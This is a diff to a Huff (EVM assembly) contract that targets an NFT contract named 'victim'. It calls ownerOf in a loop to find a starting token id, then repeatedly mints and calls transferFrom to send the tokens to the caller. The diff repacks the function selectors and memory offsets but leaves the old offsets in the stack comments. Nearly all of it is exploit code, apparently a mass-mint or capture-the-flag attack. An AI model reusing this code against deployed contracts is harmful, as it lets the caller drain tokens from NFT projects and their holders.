@@ -7,17 +7,17 @@
     returndatasize mload                    // [victim, start]
 
     // mstore function selectors
-    0x1249c58b23b872dd6352211e returndatasize mstore  
+    0x1249c58b23b872dd6352211e0000000000000000000000000000000000000000 returndatasize mstore  
                                             // [victim, start]
     dup1 dup3                               // [start, victim, victim, start]
 
     // Loop over ownerOf checks until it fails, giving us starting token id
     is_owned:
         // mstore start
-        0x20 mstore                         // [victim, victim, start]
+        0x0c mstore                         // [victim, victim, start]
 
         // ownerOf call
-        calldatasize 0x24 0x1c              // [0x1c, 0x24, 0, victim, victim, start]
+        calldatasize 0x24 0x08              // [0x1c, 0x24, 0, victim, victim, start]
         calldatasize swap4                  // [victim, 0x1c, 0x24, 0, 0, victim, start]
         gas staticcall                      // [success, victim, start]
 
@@ -27,32 +27,32 @@
     is_owned jumpi                          // [start + 1, victim, victim, start + 1]
 
     // mstore contract address
-    address 0x1c mstore                     // [start, victim, victim, start]
+    address 0x08 mstore                     // [start, victim, victim, start]
 
     // mstore caller address
-    caller 0x3c mstore                      // [start, victim, victim, start]
+    caller 0x28 mstore                      // [start, victim, victim, start]
 
     // Get end
     dup1 0x94 add                           // [end, start, victim, victim, start]
 
     // Initial mint
-    swap2 calldatasize 0x04 0x14 calldatasize calldatasize swap5    
+    swap2 calldatasize 0x04 calldatasize calldatasize calldatasize swap5    
                                             // [victim, 0, 0x14, 0x04, 0, 0, start, end, victim, start]
     gas call swap1 sub                            // [i, end, victim, start]
 
     // Loop over mint and transfers
     next_iter:
         // mstore i
-        dup1 0x5c mstore                    // [i, end, victim, start]
+        dup1 0x48 mstore                    // [i, end, victim, start]
 
         // Mint
-        dup3 calldatasize 0x04 0x14 calldatasize calldatasize swap5 
+        dup3 calldatasize 0x04 calldatasize calldatasize calldatasize swap5 
                                             // [victim, 0x00, 0x14, 0x04, 0x00, 0x00, i, end, victim, start]
         gas call                            // [success, i, end, victim, start]
 
         // Transfer
         dup4 swap1                          // [success, victim, i, end, victim, start]
-        0x64 0x18 calldatasize calldatasize swap5           
+        0x64 0x04 calldatasize calldatasize swap5           
                                             // [victim, 0, 0x18, 0x64, success, 0, i, end, victim, start]
         gas call                            // [success, i, end, victim, start]
 
@@ -64,10 +64,10 @@
     next_iter jumpi                         // [i + 1, end, victim, start]
 
     // mstore start
-    0x5c mstore                             // [end, victim, start]
+    0x48 mstore                             // [end, victim, start]
 
     // Transfer initial nft
-    swap1 calldatasize 0x64 0x18 calldatasize calldatasize swap5    
+    swap1 calldatasize 0x64 0x04 calldatasize calldatasize swap5    
                                             // [victim, 0, 0x18, 0x64, 0, 0, i, end, start]
     gas call                                // [success, end, start]
 
